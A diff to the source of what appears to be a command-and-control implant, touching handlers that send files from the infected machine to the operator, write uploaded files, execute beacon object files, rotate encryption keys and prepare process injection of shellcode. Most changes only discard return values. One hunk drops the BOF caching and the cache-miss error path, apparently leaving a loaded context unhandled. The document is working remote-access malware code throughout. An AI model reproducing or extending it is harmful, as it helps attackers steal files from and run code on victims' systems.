@@ -79,7 +79,7 @@ bool handleFileDownloadStart(const uint8_t* args, size_t args_len) {
     const wchar_t* file_path = (const wchar_t*)(args + 6);
 
     if (!validateDownloadPath(file_path, path_len)) {
-        networkMgr.sendFileDownloadAck(0, 1);
+        (void)networkMgr.sendFileDownloadAck(0, 1);
         return false;
     }
 
@@ -87,7 +87,7 @@ bool handleFileDownloadStart(const uint8_t* args, size_t args_len) {
     BeaconError err = transferMgr.startDownload(file_path, chunk_size);
     if (err != BeaconError::SUCCESS) {
         g_debugPrint("[FileDownload] Failed to start download: %s", BeaconErrorToString(err));
-        networkMgr.sendFileDownloadAck(0, 1);
+        (void)networkMgr.sendFileDownloadAck(0, 1);
         return false;
     }
 
@@ -99,7 +99,7 @@ bool handleFileDownloadStart(const uint8_t* args, size_t args_len) {
                      (unsigned long)state->fileSize, (unsigned long)state->lastChunkIndex);
     }
 
-    networkMgr.sendFileDownloadAck(state ? state->fileSize : 0, 0);
+    (void)networkMgr.sendFileDownloadAck(state ? state->fileSize : 0, 0);
     return true;
 }
 
@@ -232,7 +232,7 @@ bool handleEcho(const uint8_t* args, size_t args_len) {
             __memcpy(echo_buf, args, args_len);
             echo_buf[args_len] = '\0';
             
-            ::sendData(static_cast<const void*>(echo_buf), args_len);
+            (void)::sendData(static_cast<const void*>(echo_buf), args_len);
             __free(echo_buf);
         }
     }
@@ -303,7 +303,7 @@ bool handleBofExec(const uint8_t* args, size_t args_len) {
         int outLen = 0;
         char* output = BeaconGetOutputData(&outLen);
         if (output && outLen > 0) {
-            pandragon::sendBofOutput(output, outLen, 0);
+            (void)pandragon::sendBofOutput(output, outLen, 0);
             __free(output);
         }
     } else if (bof_len > 0) {
@@ -339,20 +339,9 @@ bool handleBofExec(const uint8_t* args, size_t args_len) {
         int outLen = 0;
         char* output = BeaconGetOutputData(&outLen);
         if (output && outLen > 0) {
-            pandragon::sendBofOutput(output, outLen, 0);
+            (void)pandragon::sendBofOutput(output, outLen, 0);
             __free(output);
         }
-
-        if (!BofCacheManager::instance().insert(bof_id, ctx)) {
-            g_debugPrint("[BOF_EXEC] Failed to cache bof_id=%u (cache full?)", bof_id);
-            CleanupCOFF(ctx);
-            __free(ctx);
-        } else {
-            g_debugPrint("[BOF_EXEC] BOF id=%u cached and executed", bof_id);
-        }
-    } else {
-        g_debugPrint("[BOF_EXEC] Cache miss but bof_len=0 (bof_id=%u not found)", bof_id);
-        return false;
     }
 
     return false;
@@ -461,11 +450,11 @@ bool handleFileDownload(const uint8_t* args, size_t args_len) {
 
     if (file_data) {
         g_debugPrint("[FILE_DOWNLOAD] Read %lu bytes", (unsigned long)file_size);
-        networkMgr.sendFileContent(file_path, file_data, file_size, 0);
+        (void)networkMgr.sendFileContent(file_path, file_data, file_size, 0);
         __free(file_data);
     } else {
         g_debugPrint("[FILE_DOWNLOAD] Failed to read file: %ls", file_path);
-        networkMgr.sendFileContent(file_path, nullptr, 0, 1);
+        (void)networkMgr.sendFileContent(file_path, nullptr, 0, 1);
     }
     return false;
 }
@@ -489,7 +478,7 @@ bool handleFileUpload(const uint8_t* args, size_t args_len) {
                  (int)path_len, file_path, (unsigned long)file_size);
 
     BOOL write_result = writeFileToDisk(getfuncTable(), file_path, file_data, file_size);
-    networkMgr.sendFileWriteResult(write_result ? 0 : 1);
+    (void)networkMgr.sendFileWriteResult(write_result ? 0 : 1);
     return false;
 }
 
@@ -509,12 +498,12 @@ bool handleRotateKey(const uint8_t* args, size_t args_len) {
     const uint8_t* my_beacon_id = runtime.getBeaconId();
     if (__memcmp(rotate_req->beacon_id, my_beacon_id, 8) != 0) {
         g_debugPrint("[ROTATE_KEY] Beacon ID mismatch - rejecting");
-        networkMgr.sendKeyRotateAck(1);
+        (void)networkMgr.sendKeyRotateAck(1);
         return false;
     }
 
     g_debugPrint("[ROTATE_KEY] Beacon ID verified - rotating key");
-    networkMgr.sendKeyRotateAck(0);
+    (void)networkMgr.sendKeyRotateAck(0);
     
     // Update runtime config and underlying network layer
     __memcpy(runtime.getConfig().crypto_key, rotate_req->new_crypto_key, 32);
@@ -572,8 +561,6 @@ bool handleExit(const uint8_t* args, size_t args_len) {
 #include "../include/injection.h"
 
 static constexpr uint32_t MAX_SHELLCODE_SIZE = 0x100000;  // 1MB max shellcode
-static constexpr uint32_t MAX_PATH_LEN_INJECT = 512;
-
 // could be a BOF. TODO
 bool handleInjectProcess(const uint8_t* args, size_t args_len) {
     /*
